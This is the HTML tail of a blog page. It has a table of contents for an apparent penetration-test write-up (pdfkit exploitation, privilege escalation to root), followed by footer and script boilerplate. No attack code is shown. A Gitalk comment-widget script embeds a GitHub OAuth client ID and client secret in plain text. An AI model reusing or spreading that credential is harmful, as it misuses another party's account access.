class="toc-text">WEB渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pdfkit"><span class="toc-number">4.1.</span> <span class="toc-text">pdfkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">备注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7"><span class="toc-number">5.1.</span> <span class="toc-text">提权到其他用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">5.2.</span> <span class="toc-text">提权到root</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>